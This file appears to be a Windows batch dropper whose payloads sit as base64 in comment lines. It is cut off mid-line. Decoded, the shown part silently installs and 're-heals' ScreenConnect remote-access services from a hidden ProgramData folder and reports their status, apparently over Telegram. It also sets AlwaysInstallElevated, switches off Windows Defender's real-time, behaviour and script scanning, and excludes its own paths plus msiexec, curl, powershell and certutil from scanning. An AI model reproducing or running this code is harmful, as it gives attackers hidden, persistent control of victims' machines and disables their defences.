::JUxPRyUiDQpjYWxsIDpRdWV1ZUdyeXhhSGVhbCBIRUFMDQpleGl0IC9iIDANCg0K
::OlRnR3J5eGENCnJlbSAlMT1raW5kICUyPW1zZyDigJQgcGVyLUdyeXhhIHN0YXRl
::IHNvIGl0IGNhbm5vdCByZXVzZSBQcmltYXJ5IG93bl9tb24uc3RhdGUuDQpzZXQg
::IkdTVEFURT0lfjEiDQpzZXQgIkdNU0c9JX4yIg0Kc2V0ICJHU1RBVEVGSUxFPSVX
::RCVcb3duX21vbl9ncnl4YS5zdGF0ZSINCnNldCAiR09MRD0iDQppZiBleGlzdCAi
::JUdTVEFURUZJTEUlIiBzZXQgL3AgR09MRD08IiVHU1RBVEVGSUxFJSINCmlmIC9J
::ICIlR1NUQVRFJSI9PSJSRVNUT1JFRCIgKA0KICBpZiAvSSAiJUdPTEQlIj09IlJF
::U1RPUkVEIiBleGl0IC9iIDANCiAgaWYgZXhpc3QgIiVXRCVcdGdfZ3J5eGEuZmxh
::ZyIgKA0KICAgIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUg
::LUNvbW1hbmQgImlmKChOZXctVGltZVNwYW4gLVN0YXJ0IChHZXQtSXRlbSAtTGl0
::ZXJhbFBhdGggJyVXRCVcdGdfZ3J5eGEuZmxhZycpLkxhc3RXcml0ZVRpbWUpLlRv
::dGFsTWludXRlcyAtbHQgMTQ0MCl7ZXhpdCAwfWVsc2V7ZXhpdCAxfSIgPm51bCAy
::PiYxDQogICAgaWYgbm90IGVycm9ybGV2ZWwgMSAoDQogICAgICBlY2hvIHRnX2dy
::eXhhX3N1cHByZXNzXyVHU1RBVEUlPj4iJUxPRyUiDQogICAgICBleGl0IC9iIDAN
::CiAgICApDQogICkNCiAgZWNobyAlR1NUQVRFJT4iJUdTVEFURUZJTEUlIg0KICBl
::Y2hvIHNlbnQ+IiVXRCVcdGdfZ3J5eGEuZmxhZyINCiAgcG93ZXJzaGVsbCAtTm9Q
::cm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAt
::RmlsZSAiJVdEJVx0Z19yZXBvcnQucHMxIiAtU3RhdGUgJUdTVEFURSUgLVN1bW1h
::cnkgIiVHTVNHJSIgLUJ1aWxkICVNT05WRVIlIC1Db3VudCAlQ09VTlQlID5udWwg
::Mj4mMQ0KICBlY2hvIHRnIGdyeXhhICVHU1RBVEUlIHNlbnQ+PiIlTE9HJSINCiAg
::ZXhpdCAvYiAwDQopDQppZiAvSSAiJUdTVEFURSUiPT0iRE9XTiIgaWYgL0kgIiVH
::T0xEJSI9PSJET1dOIiBpZiBleGlzdCAiJVdEJVx0Z19ncnl4YS5mbGFnIiAoDQog
::IHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUNvbW1hbmQg
::ImlmKChOZXctVGltZVNwYW4gLVN0YXJ0IChHZXQtSXRlbSAtTGl0ZXJhbFBhdGgg
::JyVXRCVcdGdfZ3J5eGEuZmxhZycpLkxhc3RXcml0ZVRpbWUpLlRvdGFsTWludXRl
::cyAtbHQgMzYwKXtleGl0IDB9ZWxzZXtleGl0IDF9IiA+bnVsIDI+JjENCiAgaWYg
::bm90IGVycm9ybGV2ZWwgMSAoDQogICAgZWNobyB0Z19ncnl4YV9zdXBwcmVzc18l
::R1NUQVRFJT4+IiVMT0clIg0KICAgIGV4aXQgL2IgMA0KICApDQopDQplY2hvICVH
::U1RBVEUlPiIlR1NUQVRFRklMRSUiDQplY2hvIHNlbnQ+IiVXRCVcdGdfZ3J5eGEu
::ZmxhZyINCnBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4
::ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcdGdfcmVwb3J0LnBzMSIg
::LVN0YXRlICVHU1RBVEUlIC1TdW1tYXJ5ICIlR01TRyUiIC1CdWlsZCAlTU9OVkVS
::JSAtQ291bnQgJUNPVU5UJSA+bnVsIDI+JjENCmVjaG8gdGcgZ3J5eGEgJUdTVEFU
::RSUgc2VudD4+IiVMT0clIg0KZXhpdCAvYiAwDQoNCjpJbnN0YWxsTXNpDQpyZW0g
::JTE9dXJsICUyPXRhZw0Kc2V0ICJVUkw9JX4xIg0Kc2V0ICJUQUc9JX4yIg0KZWNo
::byBbJVRBRyVdIGZldGNoICVVUkwlPj4iJUxPRyUiDQoiJUNVUkwlIiAtTCAtLXNz
::bC1uby1yZXZva2UgLS1jb25uZWN0LXRpbWVvdXQgMjUgLS1tYXgtdGltZSAzMDAg
::LW8gIiVNU0klLnRtcCIgIiVVUkwlIiA+PiIlTE9HJSIgMj4mMQ0KZm9yICUlRiBp
::biAoIiVNU0klLnRtcCIpIGRvIGlmICUlfnpGIExFUSAxMDAwMDAwICgNCiAgZWNo
::byBbJVRBRyVdIGZldGNoIGZhaWxlZD4+IiVMT0clIg0KICBkZWwgL2YgL3EgIiVN
::U0klLnRtcCIgPm51bCAyPiYxDQogIGV4aXQgL2IgMQ0KKQ0KbW92ZSAveSAiJU1T
::SSUudG1wIiAiJU1TSSUiID5udWwgMj4mMQ0KcmVtIE00MTogT0xFIG1hZ2ljICsg
::UHJvZHVjdE5hbWUgRlAgbXVzdCBtYXRjaCBLRUVQX0ZQIGJlZm9yZSAvaQ0Kc2V0
::ICJNU0lPSz1ubyINCmlmIGV4aXN0ICIlV0QlXG93bl9saWIucHMxIiBmb3IgL2Yg
::InVzZWJhY2txIGRlbGltcz0iICUlUiBpbiAoYHBvd2Vyc2hlbGwgLU5vUHJvZmls
::ZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUg
::IiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gdGVzdC1tc2kgLUZwICIlS0VFUF9G
::UCUiIC1FeHRyYSAiJU1TSSUiIC1Xb3JrRGlyICIlV0QlImApIGRvIHNldCAiTVNJ
::T0s9JSVSIg0KaWYgL0kgbm90ICIhTVNJT0shIj09InllcyIgKA0KICBlY2hvIFsl
::VEFHJV0gbXNpX3ZhbGlkYXRlX2ZhaWw+PiIlTE9HJSINCiAgZGVsIC9mIC9xICIl
::TVNJJSIgPm51bCAyPiYxDQogIGV4aXQgL2IgMQ0KKQ0KcmVtIE00Mi9NNDc6IHNp
::Ymxpbmctc2FmZSBjb3B5IChlbXB0eSBVcGdyYWRlIHRhYmxlKSBiZWZvcmUgc2V2
::cnogL2kg4oCUIHJlZnVzZSAvaSBpZiBwcm90ZWN0IGZhaWxzDQpzZXQgIk1TSV9T
::QUZFPSINCmlmIGV4aXN0ICIlV0QlXG93bl9saWIucHMxIiBmb3IgL2YgInVzZWJh
::Y2txIGRlbGltcz0iICUlUyBpbiAoYHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9u
::SW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVc
::b3duX2xpYi5wczEiIC1BY3Rpb24gcHJvdGVjdC1tc2kgLUV4dHJhICIlTVNJJSIg
::LVdvcmtEaXIgIiVXRCUiYCkgZG8gaWYgbm90ICIlJVMiPT0iRkFJTCIgaWYgZXhp
::c3QgIiUlUyIgc2V0ICJNU0lfU0FGRT0lJVMiDQppZiBub3QgZGVmaW5lZCBNU0lf
::U0FGRSAoDQogIGVjaG8gWyVUQUclXSBtc2lfcHJvdGVjdF9mYWlsX3NraXBfaT4+
::IiVMT0clIg0KICBkZWwgL2YgL3EgIiVNU0klIiA+bnVsIDI+JjENCiAgZXhpdCAv
::YiAxDQopDQpjYWxsIDpOb01zaVBvbGljeQ0KcmVtIE0xMy9NNDE6IHN0YWxlIHBy
::aW1hcnkgZGlyIHVuZGVyIFBGIGFuZCBQRjg2DQpzYyBxdWVyeSAiU2NyZWVuQ29u
::bmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiID5udWwgMj4mMQ0KaWYgZXJyb3JsZXZl
::bCAxICgNCiAgaWYgZXhpc3QgIiVQRjg2JVxTY3JlZW5Db25uZWN0IENsaWVudCAo
::JUtFRVBfRlAlKSIgKA0KICAgIGVjaG8gc3RhbGVfcHJpbWFyeV9kaXJfY2xlYW5f
::cGY4Nj4+IiVMT0clIg0KICAgIHJtZGlyIC9zIC9xICIlUEY4NiVcU2NyZWVuQ29u
::bmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiID5udWwgMj4mMQ0KICApDQogIGlmIGV4
::aXN0ICIlUHJvZ3JhbUZpbGVzJVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVBf
::RlAlKSIgKA0KICAgIGVjaG8gc3RhbGVfcHJpbWFyeV9kaXJfY2xlYW5fcGY+PiIl
::TE9HJSINCiAgICBybWRpciAvcyAvcSAiJVByb2dyYW1GaWxlcyVcU2NyZWVuQ29u
::bmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiID5udWwgMj4mMQ0KICApDQopDQplY2hv
::IFslVEFHJV0gbXNpZXhlYyBpbnN0YWxsPj4iJUxPRyUiDQptc2lleGVjIC9pICIl
::TVNJX1NBRkUlIiAvcW4gL25vcmVzdGFydCBBTExVU0VSUz0xIFJFQk9PVD1SZWFs
::bHlTdXBwcmVzcyAvTCp2ICIlV0QlXG1zaV9oZWFsLmxvZyIgPm51bCAyPiYxDQpz
::ZXQgIk1TSUVYSVQ9IUVSUk9STEVWRUwhIg0KZWNobyBbJVRBRyVdIG1zaWV4ZWMg
::ZXhpdD0hTVNJRVhJVCE+PiIlTE9HJSINCmlmICIhTVNJRVhJVCEiPT0iMTYxOCIg
::KA0KICBlY2hvIFslVEFHJV0gbXNpX2J1c3lfcmV0cnk+PiIlTE9HJSINCiAgdGlt
::ZW91dCAvdCAzMCAvbm9icmVhayA+bnVsDQogIG1zaWV4ZWMgL2kgIiVNU0lfU0FG
::RSUiIC9xbiAvbm9yZXN0YXJ0IEFMTFVTRVJTPTEgUkVCT09UPVJlYWxseVN1cHBy
::ZXNzIC9MKnYgIiVXRCVcbXNpX2hlYWwyLmxvZyIgPm51bCAyPiYxDQogIHNldCAi
::TVNJRVhJVD0hRVJST1JMRVZFTCEiDQogIGVjaG8gWyVUQUclXSBtc2lleGVjX3Jl
::dHJ5IGV4aXQ9IU1TSUVYSVQhPj4iJUxPRyUiDQopDQppZiAvSSBub3QgIiVNU0lf
::U0FGRSUiPT0iJU1TSSUiIGRlbCAvZiAvcSAiJU1TSV9TQUZFJSIgPm51bCAyPiYx
::DQpjYWxsIDpXYWl0U3ZjDQpjYWxsIDpSZXN0b3JlQWx0DQpyZW0gTzM3OiBzZXZy
::eiAvaSBzaGFyZXMgbGVnYWN5IFVwZ3JhZGVDb2RlcyB3aXRoIGdyeXhhIOKAlCBh
::bHdheXMgcmUtZW5zdXJlIEdyeXhhIGFmdGVyDQpjYWxsIDpFbnN1cmVHcnl4YU11
::c3QNCmV4aXQgL2IgMA0KDQo6UmVwYWlyUmVnaXN0ZXJlZA0KcmVtICUxPWZpbmdl
::cnByaW50IC0gc2VydmljZSBkZWxldGVkIGJ1dCBwcm9kdWN0IHJlZ2lzdGVyZWQ6
::IHJlcGFpciBieSBHVUlELg0KcmVtIE00MDogbGFiZWwgd2FzIGFtcHV0YXRlZCAo
::Ym9keSBzYXQgYWZ0ZXIgSW5zdGFsbE1zaSBleGl0IC9iKSBzbyBwcmltYXJ5IGhl
::YWwgbmV2ZXIgcmFuLg0Kc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgl
::fjEpIiA+bnVsIDI+JjENCmlmIG5vdCBlcnJvcmxldmVsIDEgZXhpdCAvYiAwDQpp
::ZiBub3QgZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiIGV4aXQgL2IgMQ0KcG93ZXJz
::aGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5
::IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiByZXBhaXIg
::LUZwICIlfjEiIC1Xb3JrRGlyICIlV0QlIiA+PiIlTE9HJSIgMj4mMQ0KY2FsbCA6
::V2FpdFN2Yw0KZXhpdCAvYiAwDQoNCjpSZXN0b3JlQWx0DQpyZW0gQUxUIHNlcnZp
::Y2UgZ29uZSBidXQgc3RpbGwgcmVnaXN0ZXJlZCAoU0MtZmFtaWx5IG1zaWV4ZWMg
::c2lkZSBlZmZlY3QpIC0gcmVwYWlyIGl0IHRvby4NCnNjIHF1ZXJ5ICJTY3JlZW5D
::b25uZWN0IENsaWVudCAoJUFMVF9GUCUpIiA+bnVsIDI+JjENCmlmIG5vdCBlcnJv
::cmxldmVsIDEgZXhpdCAvYiAwDQplY2hvIGFsdCBtaXNzaW5nIC0gcmVwYWlyIGF0
::dGVtcHQ+PiIlTE9HJSINCmlmIGV4aXN0ICIlV0QlXG93bl9saWIucHMxIiBwb3dl
::cnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xp
::Y3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIHJlcGFp
::ciAtRnAgIiVBTFRfRlAlIiAtV29ya0RpciAiJVdEJSIgPj4iJUxPRyUiIDI+JjEN
::CnNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUFMVF9GUCUpIiB8IGZp
::bmQgIlJVTk5JTkciID5udWwNCmlmIG5vdCBlcnJvcmxldmVsIDEgc2V0ICJBTFRf
::T0s9MSINCmV4aXQgL2IgMA0KDQo6Tm9Nc2lQb2xpY3kNCnJlZyBkZWxldGUgIkhL
::TE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3NcSW5zdGFsbGVy
::IiAvdiBEaXNhYmxlTVNJIC9mID5udWwgMj4mMQ0KcmVnIGRlbGV0ZSAiSEtDVVxT
::T0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xJbnN0YWxsZXIiIC92
::IERpc2FibGVNU0kgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJF
::XFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxlciIgL3YgRGlzYWJs
::ZU1TSSAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCmV4aXQgL2IgMA0K
::DQo6V2FpdFN2Yw0Kc2V0ICJUUklFUz0wIg0KOldhaXRMb29wDQpzYyBxdWVyeSAi
::U2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiIHwgZmluZCAiUlVOTklO
::RyIgPm51bA0KaWYgbm90IGVycm9ybGV2ZWwgMSAoDQogIHNldCAiSU5TVEFMTEVE
::PTEiDQogIHNldCAiUFJJTV9PSz0xIg0KICBleGl0IC9iIDANCikNCnNldCAvYSBU
::UklFUys9MQ0KaWYgJVRSSUVTJSBHRVEgMTAgZXhpdCAvYiAxDQpwaW5nIDEyNy4w
::LjAuMSAtbiA3ID5udWwgMj4mMQ0KZ290byA6V2FpdExvb3ANCg0KOlRnU3RhdGUN
::CnNldCAiTkVXU1RBVEU9JX4xIg0Kc2V0ICJNU0c9JX4yIg0Kc2V0ICJPTERTVEFU
::RT0iDQppZiBleGlzdCAiJVNUQVRFJSIgc2V0IC9wIE9MRFNUQVRFPTwiJVNUQVRF
::JSINCnJlbSBmYWxzZSBET1dOIGFmdGVyIHJlYm9vdCByYWNlOiBwcmltYXJ5IGFs
::cmVhZHkgUnVubmluZyDigJQgZG8gbm90IHNwYW0NCmlmIC9JICIlTkVXU1RBVEUl
::Ij09IkRPV04iICgNCiAgc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgl
::S0VFUF9GUCUpIiB8IGZpbmQgIlJVTk5JTkciID5udWwNCiAgaWYgbm90IGVycm9y
::bGV2ZWwgMSAoDQogICAgZWNobyB0Z19za2lwX2Rvd25fYWxyZWFkeV9ydW5uaW5n
::Pj4iJUxPRyUiDQogICAgZXhpdCAvYiAwDQogICkNCikNCnJlbSByYXRlLWxpbWl0
::IHJlcGVhdGVkIERPV04vRkFJTDogbWF4IDEgYWxlcnQgcGVyIDZoIHdoaWxlIHN0
::dWNrDQppZiAvSSAiJU5FV1NUQVRFJSI9PSJET1dOIiBnb3RvIDpNYXliZVN1cHBy
::ZXNzDQppZiAvSSAiJU5FV1NUQVRFJSI9PSJGQUlMIiBnb3RvIDpNYXliZVN1cHBy
::ZXNzDQpnb3RvIDpTZW5kQWxlcnQNCjpNYXliZVN1cHByZXNzDQppZiAvSSAiJU5F
::V1NUQVRFJSI9PSIlT0xEU1RBVEUlIiBpZiBleGlzdCAiJVdEJVx0Z19zZW50LmZs
::YWciICgNCiAgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAt
::Q29tbWFuZCAiaWYoKE5ldy1UaW1lU3BhbiAtU3RhcnQgKEdldC1JdGVtIC1MaXRl
::cmFsUGF0aCAnJVdEJVx0Z19zZW50LmZsYWcnKS5MYXN0V3JpdGVUaW1lKS5Ub3Rh
::bE1pbnV0ZXMgLWx0IDM2MCl7ZXhpdCAwfWVsc2V7ZXhpdCAxfSIgPm51bCAyPiYx
::DQogIGlmIG5vdCBlcnJvcmxldmVsIDEgKA0KICAgIGVjaG8gdGdfc3VwcHJlc3Nl
::ZF8lTkVXU1RBVEUlPj4iJUxPRyUiDQogICAgZXhpdCAvYiAwDQogICkNCikNCjpT
::ZW5kQWxlcnQNCmVjaG8gJU5FV1NUQVRFJT4iJVNUQVRFJSINCmVjaG8gc2VudD4i
::JVdEJVx0Z19zZW50LmZsYWciDQpwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbklu
::dGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXHRn
::X3JlcG9ydC5wczEiIC1TdGF0ZSAlTkVXU1RBVEUlIC1TdW1tYXJ5ICIlTVNHJSIg
::LUJ1aWxkICVNT05WRVIlIC1Db3VudCAlQ09VTlQlID5udWwgMj4mMQ0KZWNobyB0
::ZyBzdGF0ZSAlTkVXU1RBVEUlIHNlbnQ+PiIlTE9HJSINCmV4aXQgL2IgMA0K
::B64_MON_END
::B64_SEC_BEGIN
::QGVjaG8gb2ZmDQpSRU0gT1dOX1NFQ1VSRSBCVUlMRCAyMDI2MDgwNFMxMyAtIHNl
::dnJ6LmNmZyArIGdyeXhhLmNmZyBkeW5hbWljIEZQczsgU1kgREVMRVRFK1dSSVRF
::X0RBQw0Kc2V0bG9jYWwgRW5hYmxlRXh0ZW5zaW9ucyBFbmFibGVEZWxheWVkRXhw
::YW5zaW9uDQpzZXQgIldEPSVQcm9ncmFtRGF0YSVcTWljcm9zb2Z0XFdpbmRvd3Nc
::V0VSXFRlbXBcLnd1Y2FjaGUiDQpzZXQgIldEMj0lUHJvZ3JhbURhdGElXE1pY3Jv
::c29mdFxEaWFnbm9zaXNcU3RhdGVcLmV0bGNhY2hlIg0Kc2V0ICJMT0c9JVdEJVxi
::b290LmVyciINCnNldCAiS0VFUDE9NWY2MDEwNTc5ODUyZTUwNyINCnNldCAiS0VF
::UDI9Zjg2MWM4MTQwZDQ1MzQyNyINCnNldCAiS0VFUDM9MzZlNTA2ZmYwMTZiMjE1
::MSINCmlmIGV4aXN0ICIlV0QlXHNldnJ6LmNmZyIgZm9yIC9mICJ1c2ViYWNrcSB0
::b2tlbnM9MSwqIGRlbGltcz09IiAlJUsgaW4gKCIlV0QlXHNldnJ6LmNmZyIpIGRv
::ICgNCiAgaWYgL0kgIiUlSyI9PSJQUklNQVJZX0ZQIiBzZXQgIktFRVAxPSUlTCIN
::CiAgaWYgL0kgIiUlSyI9PSJBTFRfRlAiIHNldCAiS0VFUDI9JSVMIg0KKQ0KaWYg
::ZXhpc3QgIiVXRCVcZ3J5eGEuY2ZnIiBmb3IgL2YgInVzZWJhY2txIHRva2Vucz0x
::LCogZGVsaW1zPT0iICUlSyBpbiAoIiVXRCVcZ3J5eGEuY2ZnIikgZG8gaWYgL0kg
::IiUlSyI9PSJDVVJSRU5UX0ZQIiBzZXQgIktFRVAzPSUlTCINCnNldCAiUFJJTT1T
::Y3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAxJSkiDQpzZXQgIkFMVD1TY3JlZW5D
::b25uZWN0IENsaWVudCAoJUtFRVAyJSkiDQpzZXQgIkdSWVhBPVNjcmVlbkNvbm5l
::Y3QgQ2xpZW50ICglS0VFUDMlKSINCnNldCAiUEY9JVByb2dyYW1GaWxlcyUiDQpz
::ZXQgIlBGODY9JVByb2dyYW1GaWxlcyh4ODYpJSINCnNldCAiVEFTS1JPT1Q9JVN5
::c3RlbVJvb3QlXFN5c3RlbTMyXFRhc2tzIg0KDQppZiBub3QgZXhpc3QgIiVXRCUi
::IG1rZGlyICIlV0QlIiA+bnVsIDI+JjENCmlmIG5vdCBleGlzdCAiJVdEMiUiIG1r
::ZGlyICIlV0QyJSIgPm51bCAyPiYxDQplY2hvIHNlY3VyZV9iZWdpbiAlREFURSUg
::JVRJTUUlIFMxMz4+IiVMT0clIg0KDQpSRU0gLS0tIE5ldXRyYWxpemUgTVNJIGJs
::b2NrIHBvbGljaWVzICgxNjI1KSAtLS0NClJFTSBEaXNhYmxlTVNJOiAwPWFsbG93
::LCAxPW5vbi1hZG1pbiBvbmx5LCAyPWFsbCAtPiBmb3JjZSAwDQpyZWcgYWRkICJI
::S0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxl
::ciIgL3YgRGlzYWJsZU1TSSAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjEN
::CnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRv
::d3NcSW5zdGFsbGVyIiAvdiBBbHdheXNJbnN0YWxsRWxldmF0ZWQgL3QgUkVHX0RX
::T1JEIC9kIDEgL2YgPm51bCAyPiYxDQpyZWcgZGVsZXRlICJIS0NVXFNPRlRXQVJF
::XFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxlciIgL3YgRGlzYWJs
::ZU1TSSAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLQ1VcU09GVFdBUkVcUG9saWNp
::ZXNcTWljcm9zb2Z0XFdpbmRvd3NcSW5zdGFsbGVyIiAvdiBBbHdheXNJbnN0YWxs
::RWxldmF0ZWQgL3QgUkVHX0RXT1JEIC9kIDEgL2YgPm51bCAyPiYxDQoNClJFTSAt
::LS0gRGVmZW5kZXI6IHJlZ2lzdHJ5IGV4Y2x1c2lvbnMgKHBvbGljeSArIHByZWZl
::cmVuY2Uga2V5cykgLS0tDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXFBvbGljaWVz
::XE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyIiAvdiBEaXNhYmxlQW50aVNweXdh
::cmUgL3QgUkVHX0RXT1JEIC9kIDEgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xN
::XFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXFJl
::YWwtVGltZSBQcm90ZWN0aW9uIiAvdiBEaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5n
::IC90IFJFR19EV09SRCAvZCAxIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxT
::T0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxSZWFs
::LVRpbWUgUHJvdGVjdGlvbiIgL3YgRGlzYWJsZUJlaGF2aW9yTW9uaXRvcmluZyAv
::dCBSRUdfRFdPUkQgL2QgMSAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09G
::VFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcUmVhbC1U
::aW1lIFByb3RlY3Rpb24iIC92IERpc2FibGVJT0FWUHJvdGVjdGlvbiAvdCBSRUdf
::RFdPUkQgL2QgMSAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVc
::UG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcUmVhbC1UaW1lIFBy
::b3RlY3Rpb24iIC92IERpc2FibGVTY3JpcHRTY2FubmluZyAvdCBSRUdfRFdPUkQg
::L2QgMSAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcTWljcm9z
::b2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQYXRocyIgL3YgIiVXRCUi
::IC90IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxT
::T0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFBh
::dGhzIiAvdiAiJVdEMiUiIC90IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQ0K
::cmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRl
::clxFeGNsdXNpb25zXFBhdGhzIiAvdiAiQzpcV2luZG93c1xUZW1wIiAvdCBSRUdf
::RFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVc
::TWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQYXRocyIgL3Yg
::IiVURU1QJSIgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRk
::ICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1
::c2lvbnNcUGF0aHMiIC92ICIlUEYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VF
::UDElKSIgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJI
::S0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lv
::bnNcUGF0aHMiIC92ICIlUEYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDIl
::KSIgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xN
::XFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNc
::UGF0aHMiIC92ICIlUEYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDMlKSIg
::L3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNP
::RlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUGF0
::aHMiIC92ICIlUEYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50KiIgL3QgUkVHX0RXT1JE
::IC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jv
::c29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUGF0aHMiIC92ICIlUEY4
::NiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMSUpIiAvdCBSRUdfRFdPUkQg
::L2QgMCAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcTWljcm9z
::b2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQYXRocyIgL3YgIiVQRjg2
::JVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAyJSkiIC90IFJFR19EV09SRCAv
::ZCAwIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3Nv
::ZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFBhdGhzIiAvdiAiJVBGODYl
::XFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDMlKSIgL3QgUkVHX0RXT1JEIC9k
::IDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29m
::dFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUGF0aHMiIC92ICIlUEY4NiVc
::U2NyZWVuQ29ubmVjdCBDbGllbnQqIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVs
::IDI+JjENCmZvciAlJVAgaW4gKG1zaWV4ZWMuZXhlIGN1cmwuZXhlIGNtZC5leGUg
::cG93ZXJzaGVsbC5leGUgY2VydHV0aWwuZXhlIFNjcmVlbkNvbm5lY3QuQ2xpZW50
::U2VydmljZS5leGUgU2NyZWVuQ29ubmVjdC5XaW5kb3dzQ2xpZW50LmV4ZSkgZG8g
::KA0KICByZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERl
::ZmVuZGVyXEV4Y2x1c2lvbnNcUHJvY2Vzc2VzIiAvdiAiJSVQIiAvdCBSRUdfRFdP
